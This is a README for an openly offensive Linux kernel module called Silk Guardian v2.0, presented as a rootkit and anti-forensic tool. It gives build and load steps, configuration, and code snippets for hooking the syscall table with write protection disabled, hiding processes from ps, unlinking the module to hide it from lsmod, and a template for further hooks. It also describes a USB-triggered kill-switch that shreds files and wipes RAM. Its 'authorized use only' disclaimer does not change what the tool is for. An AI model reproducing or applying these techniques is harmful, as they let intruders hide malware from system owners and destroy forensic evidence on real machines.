# Silk Guardian v2.0 - Enhanced Kernel Module

## Overview

Silk Guardian v2.0 is an enhanced Linux kernel module that provides:
- **Rootkit capabilities** - Kernel-level stealth operations
- **Syscall hooking** - Intercept and modify system calls
- **Process hiding** - Hide processes from ps/top/htop
- **Module hiding** - Hide from lsmod
- **USB kill-switch** - Emergency data destruction

## Features

### 1. Syscall Hooking
- Hook `getdents` and `getdents64` to hide processes
- Hook `kill` to protect hidden processes
- Configurable hook targets

### 2. Process Hiding
- Hide specific PIDs from process listings
- Automatic hiding of protected processes
- Dynamic process list management

### 3. Module Hiding
- Hide module from `lsmod` output
- Unlink from kernel module list
- Stealth mode operation

### 4. USB Kill-Switch
- Monitor USB device changes
- Whitelist trusted devices
- Emergency file shredding
- RAM wiping (optional)
- Automatic shutdown

## Installation

### Prerequisites
```bash
# Install kernel headers
sudo apt install linux-headers-$(uname -r)  # Debian/Ubuntu
sudo dnf install kernel-devel               # Fedora/RHEL
sudo pacman -S linux-headers                # Arch
```

### Build
```bash
cd silk-guardian-v2
make
```

### Install
```bash
sudo make install
```

### Verify
```bash
sudo make status
```

## Configuration

Edit `config.h` before building:

### Shredding Configuration
```c
#define shredIterations "35"  // Gutmann method

static char *remove_files[] = {
    "/home/user/sensitive/",
    "/root/secrets/",
    NULL
};
```

### RAM Wiping
```c
#define WIPE_RAM  // Enable RAM wiping
```

### USB Whitelist
```c
static struct usb_device_id whitelist_table[] = {
    { USB_DEVICE(0x1234, 0x5678) },  // Your device
    { }
};
```

### Rootkit Configuration
```c
#define AUTO_HIDE_MODULE 1       // Hide from lsmod
#define AUTO_HIDE_PROCESSES 1    // Auto-hide processes

static const char *protected_processes[] = {
    "sofinco",
    "phantom",
    NULL
};
```

### Syscall Hooks
```c
#define HOOK_GETDENTS 1  // Hide processes
#define HOOK_KILL 1      // Protect processes
#define HOOK_OPEN 0      // File hiding (disabled)
#define HOOK_READ 0      // Data interception (disabled)
```

## Usage

### Load Module
```bash
sudo insmod silk_v2.ko
```

### Check Status
```bash
lsmod | grep silk_v2
dmesg | grep silk
```

### Unload Module
```bash
sudo rmmod silk_v2
```

### Hide Process
The module automatically hides processes listed in `protected_processes[]`.

To hide additional processes, modify the kernel module code:
```c
hide_process(1234);  // Hide PID 1234
```

## Testing

### Test Suite
```bash
sudo make test
```

### Manual Testing

1. **Load module:**
```bash
sudo insmod silk_v2.ko
```

2. **Check if hidden:**
```bash
lsmod | grep silk_v2  # Should not appear if AUTO_HIDE_MODULE=1
```

3. **Test process hiding:**
```bash
# Run a protected process
./sofinco &
ps aux | grep sofinco  # Should not appear
```

4. **Test USB kill-switch:**
```bash
# Insert non-whitelisted USB device
# System should trigger emergency protocol
```

## Security Considerations

### ⚠️ WARNINGS

1. **Kernel Panic Risk** - Incorrect syscall hooking can crash the system
2. **Data Loss** - USB kill-switch will destroy data permanently
3. **Detection** - Advanced forensic tools may detect the module
4. **Legal** - Rootkit capabilities may be illegal in some jurisdictions

### Best Practices

1. **Test in VM first** - Always test in a virtual machine
2. **Backup data** - Ensure critical data is backed up
3. **Whitelist devices** - Add all trusted USB devices to whitelist
4. **Monitor logs** - Check `dmesg` for module activity
5. **Authorized use only** - Ensure legal authorization

## Technical Details

### Syscall Table Hooking

The module locates the syscall table using `kallsyms_lookup_name()`:

```c
__sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
```

Write protection is temporarily disabled:
```c
disable_wp();
__sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
enable_wp();
```

### Process Hiding Algorithm

1. Hook `getdents` and `getdents64`
2. Intercept directory listing of `/proc`
3. Filter out hidden PIDs
4. Return modified directory listing

### Module Hiding

1. Save previous module list pointer
2. Unlink module from list
3. Module becomes invisible to `lsmod`

```c
module_previous = THIS_MODULE->list.prev;
list_del(&THIS_MODULE->list);
```

## Troubleshooting

### Module Won't Load
```bash
# Check kernel version compatibility
uname -r
ls /lib/modules/$(uname -r)/build

# Check dmesg for errors
dmesg | tail -20
```

### Syscall Hook Failed
```bash
# Check if kallsyms is available
cat /proc/kallsyms | grep sys_call_table

# May need to enable CONFIG_KALLSYMS_ALL
```

### System Crash
```bash
# Boot into recovery mode
# Remove module from autoload:
sudo rm /etc/modules-load.d/silk_v2.conf
```

## Performance Impact

- **CPU overhead:** < 1% (syscall hooking)
- **Memory usage:** ~50KB (module + data structures)
- **Latency:** < 1μs per hooked syscall

## Compatibility

### Tested Kernels
- ✅ Linux 5.x
- ✅ Linux 6.x
- ⚠️ Linux 4.x (may require modifications)

### Tested Distributions
- ✅ Ubuntu 20.04+
- ✅ Debian 11+
- ✅ Arch Linux
- ✅ Fedora 35+
- ✅ Kali Linux

## Uninstallation

### Remove Module
```bash
sudo rmmod silk_v2
```

### Clean Build Files
```bash
make clean
```

### Remove from Autoload
```bash
sudo rm /etc/modules-load.d/silk_v2.conf
```

## Development

### Adding New Hooks

1. Declare original function pointer:
```c
asmlinkage long (*original_open)(const char *filename, int flags, int mode);
```

2. Implement hook:
```c
asmlinkage long hooked_open(const char *filename, int flags, int mode) {
    // Your logic here
    return original_open(filename, flags, mode);
}
```

3. Install hook in `silk_init()`:
```c
original_open = (void *)__sys_call_table[__NR_open];
__sys_call_table[__NR_open] = (unsigned long)hooked_open;
```

4. Restore in `silk_exit()`:
```c
__sys_call_table[__NR_open] = (unsigned long)original_open;
```

## License

GPL-3.0 - See LICENSE file

## Disclaimer

**FOR AUTHORIZED USE ONLY**

This kernel module includes rootkit capabilities that can:
- Hide processes and files
- Intercept system calls
- Modify kernel behavior
- Destroy data permanently

**The authors are NOT responsible for misuse.**

## Support

- **Issues:** https://github.com/levouinse/sofinco-antiforensic/issues
- **Docs:** See main README.md

---

**Silk Guardian v2.0** - Enhanced Anti-Forensic Kernel Module
